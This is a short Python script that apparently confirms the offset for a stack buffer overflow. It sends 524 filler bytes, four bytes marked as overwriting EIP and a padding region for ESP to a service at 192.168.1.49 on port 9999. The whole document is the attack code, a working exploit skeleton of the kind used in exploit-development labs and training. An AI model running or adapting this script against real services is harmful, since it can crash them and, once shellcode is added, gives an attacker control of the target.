import socket

buffer = "A"*524
buffer += "B"*4 # this will overwrite the EIP
buffer += "C"*(1500-len(buffer)) # this will land in the stack and ESP will point here

try:
	print("Fuzzing the input with {0} bytes".format(len(buffer)))
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('192.168.1.49',9999)) 
	s.send(buffer+'\r\n')
	s.recv(1024)
	s.close()
except:
	print("Exploit failed!")
